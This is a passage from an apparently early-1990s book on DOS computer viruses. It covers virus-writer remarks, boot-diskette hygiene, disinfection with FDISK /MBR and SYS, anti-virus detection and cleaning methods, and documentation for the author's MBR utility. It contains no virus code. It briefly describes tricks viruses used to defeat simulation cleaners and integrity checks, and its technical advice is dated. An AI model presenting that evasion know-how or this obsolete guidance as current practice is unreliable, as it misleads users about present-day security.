<p>Lucifer Messiah says that the group no longer takes part in the underground activities. "Groups Like YAM and NuKE have really taken the fun out of the underground. All these junior high school kids get together, and they hack out a virus or two, then suddenly they think that they are elite enough to start their own organization. After they hack out 5,000 variants, they pretend that they're better than those who are actually doing something. Rabid and many other quality groups have also become bored and left the scene."</p>
<p>One of the members stated that the anti-virus industry gave NuKE so much attention for their VCL program that it was like they were asking for an update. Praise of this sort, plus their name included in Patti Hoffman's VSUM database is what motivates most of these virus writers.</p>
 
<p>Lucifer Messiah is a network programmer, while Sceb spends his time working in a laboratory as a consultant.</p>
<h3><a name="p64"></a>Soltan Griss</h3>
<p>[Interview pending]</p>
<h3><a name="p65"></a>Phalcon/SKISM</h3>
<p>[Interview pending]</p>
 
<h2><a name="p7"></a>Keeping Your Computer Clean</h2>
<p>Surprisingly virus safety, whose <em>bon mot</em> is <em>safe hex</em>, does not require extensive computer literacy. This chapter outlines a number of security techniques which can be implemented even by PC novices with only a rudimentary understanding of their own computer systems.</p>
<h3><a name="p71"></a>Safe Hex</h3>
<p>A few basic steps must be taken to ensure computer safety and a virus-free system. They are:</p>
<ul>
<li>Use a virus detection program regularly</li>
<li>Keep an emergency boot diskette handy</li>
<li>Back up your system regularly</li>
<li>Always test new software for viruses</li>
<li>Never boot from a diskette other than your standard boot disk or diskettes</li>
<li>Write protect any diskettes used for booting your system</li>
</ul>
<p>Once these steps have been taken, most virus emergencies can be quickly and efficiently surmounted. Following is a detailed explanation of each step.</p>
 
<h4><a name="p711"></a>Use a Virus Detection Program</h4>
<p>There are as many types of virus scanning software packages as there are virus types. (See pages , where many anti-virus packages are discussed and compared for their fortes and failures.) Regardless of the package you choose to implement, your system should be scanned for viruses at least once a week.</p>
<h4><a name="p712"></a>Create an Emergency Boot Diskette</h4>
<p>Relatively few files are neccessary on an emergency boot diskette. First, a diskette needs to be formatted with system files. This is accomplished by putting a new diskette in Drive A:, and typing:</p>
<pre class="source">
FORMAT A: /S
</pre>
<p>on the command line.</p>
<p>Next, change to the MSDOS or DOS directory; whichever directory holds the DOS files. Type:</p>
<pre class="source">
CD dirname
</pre>
<p>where <em>dirname</em> is the name of the DOS directory.</p>
 
<p>Certain files must now be copied to the emergency boot diskette. Their implementation will be explained later in this chapter. Type:</p>
<pre class="source">
COPY SYS.* A:
COPY FDISK.* A:
COPY FORMAT.* A:
</pre>
<p>There are other utilities which should be included as a supplement to the emergency disk. If your file backups are compressed, the program used to decompress them should be added to the emergency boot diskette. The anti-virus package chosen should also be included. A very useful anti-virus utility, the PC Scavenger Anti-Virus Master Boot Record, may also be installed from the emergency diskette. (more information on this will be provided later.)</p>
<p>Immediately write-protect and label the diskette once these files are installed. This diskette should be stored where it will remain safe and not be tampered with.</p>
<p>Note that the diskette's write protection must <em>NEVER</em> be removed unless it is absolutely neccessary. If this becomes neccessary, the system should be booted from the diskette first. This will avoid the emergency diskette from being contaminated by a virus that may be in memory. To update files on the diskette, boot from it, remove the write-protection, copy the files, then replace the write-
 
protection. Do NOT execute the new file until the write-protection is replaced. If the new file is infected, it will be unable to infect the other files on the emergency boot diskette.</p>
<p>There is one very important rule to live by with this emergency boot disk: when the write protection is off, only use commands which are internal to COMMAND.COM, unless it is absolutely impossible to do so, or there is no chance that the program being executed is infected. COPY and DIR are two such "safe" commands. You will need to read your DOS manual to learn which commands are internal to your particular copy of command interpreter.</p>
<h4><a name="p713"></a>Back Up Your System</h4>
<p>In case of an irreversable virus attack, backups may be your only altnernative to quickly and safely re-install your system. Since most executable files are already backed up on their original installation floppies, it is usually unneccessary to include them in the backup routine. Instead, in most cases it is only neccessary to back up files which are either created or modified by the system users.</p>
<p>Back up all new or modified files, as well as those for which no backup or installation diskettes already exist.</p>
 
<p>If a compression program is used to back up the system, make sure that the decompression program is installed on the emergency boot diskette as well.</p>
<h4><a name="p714"></a>Test New Software for Viruses or Damaging Code</h4>
<p>In 1987, Drew Davidson wrote a virus to commemorate the anniversary of the Mac II computer. As the feature program at a meeting of MacIntosh enthusiasts, software specialist Marc Canter received a copy of the <strong>MacMag Peace</strong> virus, which was presumably hidden in a game.<sup><a href="#f34" name="b34">34</a></sup></p>
<p>Canter, working on the FreeHand graphics program demonstration, infected his system, including his release software. As a result, Aldus Corporation distributed thousands of copies of the infected program to users throughout the United States.</p>
<p>Once the virus was detected, Aldus promptly recalled the product. Yet at a later date, a revised copy of the program was distributed with the same virus! Unfortunately, this complete and ignominious debacle did not even end there. Beta test versions of FreeHand had also been infected with the <strong>nVir</strong> virus.<sup><a href="#f35" name="b35">35</a></sup> Luckily, the beta testers caught the virus before the product was distributed.</p>
 
<p>This fiasco demonstrates that no software is immune to an initial infection. On two separate occasions, the company distributed a virus in a proprietary software package. Although the <strong>MacMag Peace</strong> virus was unwittingly distributed, the <strong>nVir</strong> virus was discovered early, solely due to its effects on the beta testers' systems. Without such easily detectable audio-visual clues like <strong>nVir</strong>'s beeping window changes and dog-eared Notepad graphics, the virus may have easily passed through production unnoticed. The company has since taken extreme precautions to assure that this will not happen again!</p>
<p>Hence, all executable files entering a system must be scanned for potential virus infections, regardless of their origin.</p>
<p>Virus security does not end at the .EXE and .COM file level. In December 1991, Leading Edge distributed thousands of computers, each infected with the <strong>Michelangelo</strong> virus. Users who neglected to repartition their hard drive (virtually all of their customers for that matter) eventually encountered the infection's symptoms. For those who were unaware of the virus, March 2, 1992 became their D-Day. On this date, the <strong>Michelangelo</strong> virus swiftly took
 
control and overwrote all disks on the system with garbage bytes from memory<sup><a href="#f36" name="b36">36</a></sup>.</p>
<p>The Master Boot Record and Boot Sector of the hard drive, and the Boot Sector of the floppy diskette are software files, although different than those which DOS allows user access. As a result, they are also prone to infection. Preformatted diskettes and pre-partitioned hard drives to be added to a system must be scanned for boot sector/partition viruses, just as executable files ought to be tested for other viruses.</p>
<h4><a name="p715"></a>Never Boot From Someone Else's Floppy Diskette</h4>
<p>When a computer system is set up, DOS setup diskettes are always employed. These diskettes should be stored where they cannot be tampered with, for future use, in case of emergency, or for a new system setup. Only boot from the normal boot disk or (write protected) floppy diskette, or from the emergency diskette that had been stored away.</p>
<p>Also, there is an option included with most BIOS models that will disallow a floppy drive boot. For instance, in all AMI<sup><a href="#f37" name="b37">37</a></sup> BIOS's, the boot order is configurable. By default, the system will first search the
 
A: drive for system files, and then the C: drive if none were found. This configuration may be reversed so that C: is searched first, effectually eliminating the possibility of a user booting accidentally from a floppy diskette. Newer BIOS's have an antivirus option that we will discuss later.</p>
<h4><a name="p716"></a>Write Protect ALL Boot Diskettes</h4>
<p>If a 5 1/4" diskette has the write-protect notch covered with the proper tab (any dark coloured tape will work) or a 3 1/2" diskette has the write-protect hole open, it cannot be written to. (The write-protect device on each diskette type is located at the top right-hand side of the diskette). All diskettes used for booting the system must be write protected at all times. This will avoid contamination if they are used on an infected system.</p>
 
<h2><a name="p8"></a>Cleaning an Infected System</h2>
<p>Despite any precautions taken against computer viruses, an initial infection is always possible. Be it through human error, or through malicious tampering, nothing is 100% effective in avoiding virus entry. However, if the guidelines from the first part of this chapter are heeded, cleaning a contaminated system is a relatively easy task.</p>
<p>First, reboot the system with the emergency diskette in drive A:. If the BIOS boot sequence is reversed, restore it to the default order so that drive A: is searched first. The method for accomplishing this reversal is different for each BIOS, and therefore reading the BIOS manual will be neccessary.</p>
<p>If a virus is found by executing the scanning software located on the emergency diskette, the clean program can probably remove it. If so, simply use the cleaning program to remove the virus from ALL infected files. When this is finished, scan the system again to verify file integrity.</p>
<p>At this point the emergency diskette may be removed, and the system rebooted. Moreover, the BIOS Boot Order may be reversed again to avoid future boots from floppy diskettes.</p>
 
<p>On the other hand, if the scanning program detects a virus, but contains no resources to clean the infection, different steps must be taken to restore the system. The method for cleaning the boot sector or Master Boot Record<sup><a href="#f38" name="b38">38</a></sup> is very different that of normal DOS executable files.</p>
<h3><a name="p81"></a>Executable Files</h3>
<p>It is often possible to replace only the files that were infected with the unifected copies from the setup disks. If a compression program is used, be sure to use the decompress program from the setup disks. Example: Microsoft product setup files are always compressed. Included on one of the diskettes in the package is a file called EXPAND.EXE. This file will decompress any of the files with an underscore ("_") as the last character in the extension.</p>
<pre class="source">
EXPAND FILENAME.EX_ FILENAME.EXE
</pre>
<p>Different companies typically implement alternative forms of compression and archival systems.</p>
<p>If there is no setup disk containing the needed executable file, but a backup has been made, it is usually possible to extract the needed file from the backup disk
 
without decompressing the entire archive. As the abilities and operation of each compression program are different, the manual should be referenced.</p>
<h3><a name="p82"></a>Boot Sector/Master Boot Record</h3>
<p>Although sector/MBR viruses can be difficult to diagnose, extermination is relatively straightforward and manageable. In fact, all the utilities typically needed to clean bootsector/MBR viruses are part and parcel of all DOS packages after DOS v2, but their anti-virus implications are not described.</p>
<p>Of course, the first step to disinfecting the boot sector or Master Boot Record is to reboot the computer with the emergency boot diskette explained. The files that are included on the emergency diskette are:</p>
<pre class="source">
FDISK.*
FORMAT.*
SYS.*
</pre>
<p>With most viruses of this sort, only FDISK.* will be utilized. An interesting and vital function in the FDISK.* program (since DOS 5.00) has remained largely undocumented. This is exceedingly ill-advised because, as will be shown, fiascos like the <strong>Michelangelo</strong> virus scare would never have occured if it were documented.</p>
 
<p>Once the computer is rebooted with the emergency boot diskette, type:</p>
<pre class="source">
FDISK /MBR
</pre>
<p>on the command line. The system hard drive will spin for a brief period of time. When it stops, the DOS command line will be returned. No messages are given as to the success or failure of the /MBR function. In fact, nowhere in any of the DOS documentation does this command switch appear. Perhaps once the significance of this command function is recognized, it will be documented, and a more user-friendly interface will be implemented.</p>
<p>FDISK/MBR is an interesting utility. Its only function is to rebuild the partition table from what information is available. The command will work for all MBR infecting viruses so long as the actual partition information has been preserved and not altered. Some alterations will not cause a problem.</p>
<p>Knowledge and diligent of these commands could render MBR infecting viruses obsolete. Many Trojan horses which destroy the partition information would also be outmoded. The reasoning behind the company's maintained secrecy would provide an interesting story.</p>
<p>Although rare, there are a few viruses that infect the hard drive via the boot sector, and not the MBR. These
 
viruses are effectually removed by executing the SYS.COM program, using the following commandline:</p>
<pre class="source">
SYS C:
</pre>
<p>When FDISK and SYS are used together, they effectively rewrite all the boot files on the C: hard drive. A final scan should be performed on the hard-drive before rebooting the system. Provided the virus has not severely damaged the system, the hard drive will be restored to its orginal state.</p>
<p>The source code to a freeware utility, written by the author, is inclued on page later on. The utility, called the PC Scavenger Anti-Virus Master Boot Record, rewrites the MBR with code that heuristically detemines MBR legitimacy before booting the computer. An in-depth description of its implementation and functions can be found on page . Included and installed on the emergency boot diskette, virtually ALL partition infections on the hard drive can be quickly diagnosed and corrected.</p>
<p>With most viruses of this sort, using only FDISK is sufficient. An interesting and vital function in the FDISK program (since DOS 5.00) has remained largely undocumented. This is exceedingly ill-advised because, as will be shown, fiascos lie the <strong>Michelangelo</strong> virus scare would never have occurred if it were documented.</p>
 
<p>Once the computer is rebooted with the emergency boot diskette, type:</p>
<pre class="source">
FDISK /MBR
</pre>
<p>on the commandline. The system hard drive will spin for a brief period of time. When it stops, the DOS commandline will be returned. No messages are given as to the success or failure of the /MBR function. In fact, nowhere in any of the DOS documentation is this command switch even mentioned. Perhaps once the signficance of this command function is recognized, it will be documented, and a more user-friendly interface will be implemented.</p>
<p>FDISK/MBR is an interesting function. It's only purpose is to rebuild the master boot record as long as the partition information is still intact. The PC Scavenger Antivirus Boot Record Utility is much safer in practice, and installs much more functional boot code.</p>
 
<h2><a name="p9"></a>Anti-Virus Software</h2>
<p>There are as many methods for identifying infections as there are methods for actually infecting systems. This makes it very difficult to make a well-informed choice of virus scanners based on factual information, as we have seen. Too often what one "learns" via sensationalistic media is not very accurate, and sometimes utterly false. We have already examined the meretriciousness of scandal sheets in Chapter Two. The following is a discussion of the more popular anti-virus methods available.</p>
<h3><a name="p91"></a>Scan Strings</h3>
<p>At present, the most popular technology is scan string scanning. The scanner contains a database listing segments of code peculiar to each known virus it is able to scan for, called scan strings, signatures, or fingerprints. The database often also contains routines common to families of viruses. An example: Most virus scanners scan for strings peculiar to the <strong>Tiny</strong> virus. There are many different strains of this virus, yet most may be identified by a single set of bytes common to each.</p>
<p>This technology is usually very accurate in identifying viruses with which the producer of the scanner package is acquainted. Unfortunately, this technology is
 
extrememly error-prone. McAfee SCAN has been recalled several times due to various false alarms. This Achilles' heel underlies the plight of all products that rely on scan-string technology.</p>
<p>Another potential problem is that scanners may recognize a known virus as two different viruses, when in fact only one of the virusses listed is correct. This problem seems peculiar to McAfee's ViruSCAN<sup><a href="#f39" name="b39">39</a></sup>. Often if the wrong virus name is chosen by the user, the CLEAN program virtually destroys the file being cleaned! Other times an error is generated, and the file is not is left in its infected state.</p>
<p>Because scan-string scanners rely on a database of virus signatures, scan time is augmented in direct proportion with the number of scannable viruses. The Flu-Shot<sup><a href="#f40" name="b40">40</a></sup> virus scanner is among the slowest of all scanners, and the most prone to error.</p>
<p>In general, scan-string technology was much more useful prior to 1991 when viruses were few, and the technologies used by them wasn't as advanced as they are today.</p>
 
<h3><a name="p92"></a>Filters</h3>
<p>Filter programs come in the form of a TSR program, and watch various interrupts for virus-like activity. Thunderbyte<sup><a href="#f41" name="b41">41</a></sup> is well known for its variety of filter programs.</p>
<p>Most anti-virus companies release a filter program of one kind or another. The most accurate of all seems to be a combination of TBDisk and TBFile from the Thunderbyte package.</p>
<p>Filters warn you of such activity as boot-sector writes, alterations to a file's startup code, the appendage of code to the end of an executable file, and other virus-like activities. Some filters will warn you if a program attempts to "tunnel" through the interrupt code searching for the original DOS entry point. With this information, a virus could take total control of a computer system, completely unaffected by anti-virus programs supposed to be combatting it. In many filtering anti-virus programs, the file being altered is named to help you determine whether the action is warranted or not.</p>
<p>Note that this technique is not the same as for TSR <em>scanners</em>, which store scan strings in memory and scan files as they are executed. Not only is this method slow and
 
cumbersome, it takes exceptional amounts of memory to store the scan-strings.</p>
<p>Since no scan-strings are used in filter products, and some, like Thunderbyte, hold all text in external files only to be loaded when neccessary, filters take the average of 2 to 5 kilobytes of memory, and can be loaded into Upper Memory Blocks. As a result, they are very fast and memory efficient. If written well, false alarms very seldom occur, and only in situations where they would be expected.</p>
<p>Example: If a file called X.COM is being installed and the configuration needs to change built-in parameters in the executable file, you may be given a warning similar to:</p>
<pre>
A Program is attempting to alter X.COM
Should this action be halted? Y/N
</pre>
<p>In the given situation, the modification is expected, and the user can type "N" to allow the alteration.</p>
<p>Drawbacks to this method are few. However, it must be noted that some filter programs are so poorly written that false alarms or even irrelivant warnings will cause the user so much interference that the filter is simply disabled and not used. Well written filters will not pose this problem. Another disadvantage is that if files have been infected, filters do not provide resources to locate and eradicate them.</p>
 
<h3><a name="p93"></a>Change Checkers</h3>
<p>Change checking, or integrity checking, is a diagnostic form of virus detection. This technology does not require memory resident code, and is virtually impossible to deceive if no virus is in memory. (Such is the case when you boot from your emergency boot disk).</p>
<p>Change Checkers install themselves by writing small, usually hidden, files in each directory on the disk being set up. These files contain information such as file-length and checksum for each of the executable files in that directory.</p>
<p>When scanning the disk, change checkers compare the files in each directory with the data stored in the information files. Any changes, including the presence of files not listed in the data file, are noted and presented to the program user.</p>
<p>False alarms only occur in executable files which alter their own code. This may be due to a new installation, or any number of other reasons. If a file is upgraded, you will be notified of this change as well. Fortunately such changes rarely occure without a prior warning.</p>
 
<p>In all cases, you have the option of listin these changes in the data file kept for scanning purposes. Another advantage to the above technique is that the anti-virus program never needs to be upgraded.</p>
<p>The only disadvantage is the disk space used by placing a hidden data file in each directory. Because of the DOS method of handling the disk, all files take a minimum of 2 kilobytes from the available space on the disk (the size of 1 block on a small partition. This number may be as high as 8 kilobytes for a large partition) . A disk containing many directories would have many of these files, and therefore a large amount of space would be made unavailable.</p>
<p>A possible solution to this, which is apparently yet to be implemented, is to store this data in one larger file with a directory tree list on a separate diskette. This would eliminate the hard disk usage completely. The data file could easily be stored on the emergency boot diskette, or even a diskette formatted solely for this usage. For larger hard drives, multiple diskettes may be used.</p>
<p>A minor drawback is that change checkers do not always provide a way to directly clean a virus from a file. If this is the case, reverting to the system backup diskettes, or the original setup disks will remedy the situation with no great effort.</p>
 
<h3><a name="p94"></a>Heuristic Scanning</h3>
<p>Heuristic scanning is very similar to filter scanning, except that a TSR program is not involved. Instead of waiting in memory for suspicious activity, it scans executable files for questionable code.</p>
<p>Scanners like F-Prot<sup><a href="#f42" name="b42">42</a></sup> can be configured to use scan-strings and/or heuristics for scanning. If a virus is encrypted, heuristics will usually detect the decryption routine, but must stop there.</p>
<p>Thunderbyte implements a very radical form of heuristic scanning not used in any other product. If a decryption routine is found, it will actually simulate the exectuion of the code until it is unencrypted, then proceed by scanning the remaining code with both heuristic and scan-string technologies.</p>
<p>Some properties that heuristic scanners search for are .COM/.EXE determination, potentially damaging code, unusual methods to become resident in memory, among others.</p>
<p>A common source of confusion with heuristics is that the scanner will inform you of any virus-like code, such as those listed above. Often these are classified as "false alarms" when in fact, they are not. Heuristics looks for
 
certain traits, and informs the user if suspicious code is present. Programs like FORMAT.EXE contain potentially damaging code, and heuristics will warn the user. Certain combinations of situations listed may be considered worth investigating, whereas others may not.</p>
<p>Simply put, a faulty EXE header is nothing to be alarmed about. A faulty EXE header with code written to format disks located in a graphics utility is probably something to worry about.</p>
<p>Fortunately, most heuristic scanners have a rating system, where certain traits are considered non-threatening. An example would be where a decryption routine is used, but no damaging code appears to be hiding inside. Only files which are potentially virus-like code (for instance, one which is encrypted, contains code to determine if a file is a .COM or .EXE file, goes TSR, and is able to bypass DOS to write to the hard drive) are considered suspicious enough for further investigation.</p>
<p>Heuristics are especially suited for use in conjunction with another method of virus detection such as change-checking. As well, some viruses have been written with specific routines to render certain heuristic scan techniques useless against them. This is not as problematic as the virus writers assume. Once the virus begins infecting other files, their heuristic information will
 
change, thus giving the computer user a valuable clue. Appropriate actions should be taken on any file that changes for no recognizable reason.</p>
 
<h2><a name="pa"></a>Virus Cleaning Strategies</h2>
<p>There are presently only four virus cleaning methods available. They are simple erasure, database cleaning, integrity check cleaning and simulation cleaning. Each has its own vices and virtues.</p>
<h3><a name="pa1"></a>Simple Erasure</h3>
<p>This is the only cure for overwriting viruses. This type of virus overwrites its code overtop the victim's entry code. The virus does not restore the entry code when the infected file is executed. Overwriting viruses are rare, as they are extremely noticeable.</p>
<p>Companion viruses, which infect .EXE files by creating a .COM files bearing the same name, are also cured by simple erasure of the .COM files they generate. Once the virus is deleted, the file is no longer infected. It must be noted that most companion viruses employ hidden files to remain unnoticed. Using a command-line interface such as Microsoft Shell or Norton Commander will quickly uncover these hidden files, as will the DOS program, ATTRIB. Companion virus techology is explained more in-depth later.</p>
<p>Any file infected by a virus may be deleted, then re-installed (excluding boot sector and master boot record
 
files). In rare cases, like those mentioned above, erasure may be the only method available. In the case of appending viruses (viruses which restore the original file before executing them) deletion is time consuming and unneccessary, as they may be removed using any of the ensuing cleaning methods.</p>
<p>Note: Most database cleaners provide automatic deletion of files which are infected by overwriting viruses, and often can erase companion viruses.</p>
<h3><a name="pa2"></a>Database Cleaning</h3>
<p>This is the most common method of virus cleaning simply because it is directly related to scan-string technology; McAfee's CLEAN-Up program employs this technique.</p>
<p>As long as the cleaning program being utilized is able to recognize the virus, it will usually be able to restore the file. Information on what to do with the virus, and where to find the original file startup code are stored within the cleaner's database. This information is referenced to restore the victim's startup code, and cut it to the original state.</p>
<p>The only drawbacks are that this technology cannot clean unfamiliar viruses (sometimes even if only one byte has been changed from a previously scannable virus), and
 
that there is a risk that the file will be damaged instead of cleaned if the scanner program used finds incorrect scan strings. Many virus cleaning programs will check the file to determine if the virus identification used is correct.</p>
<h3><a name="pa3"></a>Integrity Checker Cleaning</h3>
<p>This form of cleaning is surprisingly simple. If a file does not match the information stored in the integrity-check file, it can often be repaired via the information that is known about the file's clean state.</p>
<p>For instance: If the file is 1000 bytes longer than its record lists, and the first three bytes are not the same, then there is a good chance that the file may be repaired by replacing the original first three bytes, then chopping off the extra 1000 bytes. This only works for appending viruses. Considering that the very majority of viruses that infect executable files (.COM and .EXE's) are of this type, the odds are in your favour.</p>
<p>The drawbacks of this style of cleaning are glaring. Using this technique on a file infected with a prepending virus, which locates its viral code at the beginning instead of the end of the victim, will destroy the file. Overwritten files will remain, although the first few bytes may have been changed. This could cause a variety of problems. Usually the system will crash if the "cleaned" file is executed.</p>
 
<h3><a name="pa4"></a>Virus Simulation Cleaning</h3>
<p>Virus simulation is not quite what its name seems to imply. Presently Thunderbyte's TBCLEAN is the only product using this technology.</p>
<p>The clean program first patches key DOS services, thus disallowing unauthorized programs to write to the disks. For simplicity's sake, only .COM file cleaning is described in this chapter.</p>
<p>First, the file's entry point is recorded. The entry point is the location where the actual execution begins. This will be either at the file startup, or at a location pointed to by any form of JMP statement. (JMP is the machine-language instruction for JuMP.)</p>
<p>If a jump is found, the cleaner emulates the execution of the infected file until the entrypoint code is replaced, and the code resumes execution there. It can be assumed that the file is restored at this point. Next, the cleaner truncates the file at the virus entrypoint, thereby cutting the file to its previous length.</p>
<p>With some viruses, the cleaned file may still retain a small portion of the virus. This code is never executed, and is therefore not a threat. If an integrity checker was used, this will not occur, and the file will be fully recreated to its original form.</p>
 
<p>The method used for .EXE files is similar, although certain differing techniques are used due to the difference in file type.</p>
<p>When the new entrypoint is found at the execution start (no command to jump to a new starting point), it may be assumed that the virus is either an overwriting or a prepending virus. In the case of a prepending virus, the cleaner simply rewrites the file "as is" once the virus jumps back to the restored entrypoint. In most cases, the file will be cleaned and restored to its original form. Read the chapter on prepending viruses to understand how this works.</p>
<p>If the virus was an overwriting virus, it will not continue execution at the entrypoint. The cleaning program will recognize this, and prompt the user for further action (usually erasure).</p>
<p>The most significant advantage of virus simulation cleaning is that it can usually clean viruses that have remained completely unscannable, even to heuristic scanners. No other cleaning technology can behave this way.</p>
<p>There are very few problems with this technology. The most noteworthy of them is that the method is fairly easy to dupe. Some viruses write a RET (the machine language instruction for RETurning to the caller) to the entrypoint, then call it. In effect, the virus jumps to the beginning
 
of the code, then back again to resume the virus exectution. In a virus simulation, the file is assumed to have been restored, and is rewritten to the disk. Although the file is the appropriate length, and the virus is truncated, the RET remains at the beginning of the victim. Executing a file with RET as the first instruction will cause the program to simply drop the user back to DOS. It will not execute. This technique was developed by Lucifer Messiah of ANARKICK SYSTEMS, and demonstrated in a proto-virus ironically named <strong>Kill-TB</strong><sup><a href="#f43" name="b43">43</a></sup>.</p>
<p>Also, if the "divide by zero" trick used in the <strong>DOS 7</strong> virus is triggered, the virus will be executed during the cleaning session. The file will usually be cleaned, but at the expense of other files becoming infected.</p>
<p>With the use of integrity checker data files, the accuracy of this cleaning method is substantially augmented. As well, the above mentioned anti-cleaning technique is exposed by the scanner and can be dealt with in a safe manner.</p>
<p>An unusual problem occurs when using a virus simulator/cleaner on certain files which are not infected.
 
(Sometimes a file may appear to be infected, when in fact it is not). For instance, if an executable file compressed with a utility such as PKLITE<sup><a href="#f44" name="b44">44</a></sup>, virus simulator/cleaners will occasionally destroy it.</p>
<p>Another unexpected action, which may be a drawback or an advantage, depending on the user, is that if an executable file is encrypted, the cleaner will often decrypt it, and remove the decryption engine. This is good for decompressing some "permanently" compressed executable files. The arguable benefit is that when this technique is successful, the file is much easier to reverse engineer.</p>
 
<h2><a name="pb"></a>Forgotten Functions: The System and DOS Programmers</h2>
<p>The computer hardware and the operating system are the first elements to take control of the computing environment. With only a brief consideration, one will quickly understand the implications: if we are even to begin an honest fight against computer viruses, the most logical place to start is at these levels.</p>
<p>Only in very trivial ways have the operating system and hardware manufacturers attempted to control the computer virus epidemic. One wonders if they feel that it is not their job to aid in the fight against viruses.</p>
<p>In MS DOS 5.00, Microsoft introduced a new and highly effective feature to an otherwise overlooked and underrated program. The FDISK utility, included on the DOS setup diskettes, was given the new /MBR function to rebuild a faulty Master Boot Record. Unfortunately the company has neglected to document the command, despite its anti-viral abilities! If the /MBR option were to be documented, absolutely no boot sector/MBR virus could survive.</p>
<p>Originating in Microsoft DOS v6.00, a new diagnostic feature has been added in the bootup sequence. Before COMMAND.COM is executed, its startup code is checked for
 
alterations. If changes are detected, the system is halted, and a request is made for a different command interpreter (such as a copy of COMMAND.COM from another disk or diskette). Because of this simple addition to the system boot sequence, the user will be notified immediately if COMMAND.COM is infected by a virus. This diagnostic testing is unfortunately disabled by using certain configurations with the SHELL command in the CONFIG.SYS file. Perhaps this will be rectified in future versions of DOS. The DOS 7 virus, found later in this book, demonstrates a method that allows the virus to modifiy COMMAND.COM without its built-in integrity checking catching on.</p>
<p>On the hardware level, American Megatrends Inc. has added a routine to all recent BIOS versions. If the option is enabled, all writes to the boot sector/MBR are halted, and the user is prompted for permission before it is allowed to continue. Conceivably, this would only be disadvantageous to those who format diskettes on a regular basis. Even still, being prompted before writing to each disk's boot sector is far less annoying than a virus infection is.</p>
 
<p>The only real drawbacks to AMI's fight against viruses and Trojan horses are cosmetic. When writing to a disk or diskette's boot area is attempted, the screen blanks abruptly, and flashes this unnerving message in the center of the monitor:</p>
<div align="center"><strong>
BootSector Write!!!<br/>
Possible virus. Continue? Y/N
</strong></div>
<p>There have been many occurances where a computer user has received this message and thought that it was coming from a virus. Besides the blank screen, the flashing message, and the erroneous spacing in "Boot Sector", there is no mention of where the message originated! A simple copyright notice would help clarify the source of this message.</p>
<p>As well, using a program like FORMAT.COM will set off this alarm up to eight times before the format is complete. This problem still needs to be ironed out. This new routine is definitely a step in the right direction. Unfortunately its presentation is more startling than the effects of what the system is being guarded against.</p>
<p>There are still many other areas in the basic system that can be altered easily without jeapordizing the smooth operation of the system. Most important of these are the boot sector and MBR.</p>
 
<h3><a name="pb1"></a>The Master Boot Record</h3>
<p>The Master Boot Record is situated as the very first sector of the hard disk. It is a simple 512 byte file, yet performs some of the most imperative functions in hard drive management.</p>
<p>The MBR's first major task is to place a table of information in a memory location accessable by DOS. This data includes the size of each of the user's hard drive partitions, where each partition starts, what type of partitions are there, and much more. For this reason, it is called the <em>partition table</em>.<sup><a href="#f45" name="b45">45</a></sup></p>
<p>Once this has been accomplished, it must load up the boot sector and execute it. At each step of the process up to the boot sector execution, the MBR must watch for a variety of errors and conditions.</p>
<p>Despite the significant role of the MBR, and the small amount of space available to its code, there are still several dozens of unused bytes available in the allotted 446 byte boot segment. Herein lies a Pandora's box of anti-viral possiblities.</p>
 
<p>Using only a few key heuristic clues, one can determine the validity of the Master Boot Record. The PC Scavenger Anti-Virus Master Boot Record, written by the author, performs all of the functions built into the standard MBR, and more. In fact, it is modelled directly after the MBR created by the MS DOS v6.00 format utility. Following is the documentation found with the PC Scavenger utility package:</p>
<pre>
PC SCAVENGER Anti-Virus Master Boot Record
------------------------------------------
(c)1993 Karsten Johansson, PC Scavenger INET: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a1cad2c0cbe1d1c2d2c0d78fc2cecc">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
NOTE:
----
PC Scavenger is FREEWARE to private users. IE: It may NOT be used
commercially unless by explicit written permission from the author.
PC Scavenger may not be altered in any way. Do NOT distribute without
this text file.
What is PC Scavenger?
--------------------
PC Scavenger is a replacement MBR for PC's. Prior to booting the
computer, PC Scavenger runs several diagnostics, looking for signs
of a virus in the MBR. (ie: viruses like Stoned or Michelangelo).
Because PC Scavenger is FreeWare, you will not be prompted to
"Press a key to continue..." or any other annoying reminders for
payment.

What are the signs PC Scavenger looks for?
-----------------------------------------

1.) Partition Table validity
    ------------------------
 
    Some viruses alter the partition table. PC Scavenger will
    warn you of an invalid partition table.
    
2.) System memory drop
    ------------------
    MBR viruses usually lower the amount of memory available for
    system use.
    
3.) Interrupt 13h location
    ----------------------
    If a virus was written to act as a TSR, it must "trap" an
    interrupt so it can be executed later. Prior to booting,
    the only interrupt useful for this is Interrupt 13h. (Int 21h
    is the other common interrupt for viruses to trap, but at boot
    time, it is non-existant, and therefore not a threat.)

4.) End of Boot Sector Marker
    -------------------------
    Most Boot sector viruses will overwrite this marker. If it
    isn't there, that is a very suspicious thing indeed! In
    this case, PC Scavenger will not give you the "Boot Anyway?"
    prompt...it will just hang the system with an "OS Error".
    Use the rescue diskette to repair the damage.
    If PC Scavenger boots your system without warning you of a potential
    problem, then chances are you are safe. At this time, PC Scavenger
    will detect ALL of the Boot Sector/MBR viruses listed in Patti
    Hoffman's extensive virus database (VSUM, May 1993).

Will PC Scavenger interfere with my other software?
--------------------------------------------------
No. PC Scavenger is not a TSR. Once it passes control to the system,
it is completely removed from memory.

What do I do if PC Scavenger detects a virus?
--------------------------------------------
When you install PC Scavenger, you should make a bootable rescue
diskette with the following files:

          COMMAND.COM   ;automatically added with FORMAT/S
          SYS.COM       ;from your DOS or MSDOS directory
          FDISK.COM     ;from your DOS or MSDOS directory
          PCSCAV.COM    ;the PC Scavenger install/restore utility
          PCSCAV.BIN    ;the PC Scavenger replacement partition
          PARTN.BIN     ;generated when you install PC Scavenger. It is
                        ;your original Master Boot Record
 
This diskette is all you need for ANY boot sector/MBR virus. (Even if
PC Scavenger somehow missed it!). Note that you must have a different
emergency diskette for each system being protected. Mark these
diskettes
carefully!

NOTE:
----
     Write protect the rescue diskette as soon as PC Scavenger is
     installed on your system! Only remove the write protect tab
     if you have changed your partition, and wish to re-install
     PC Scavenger.
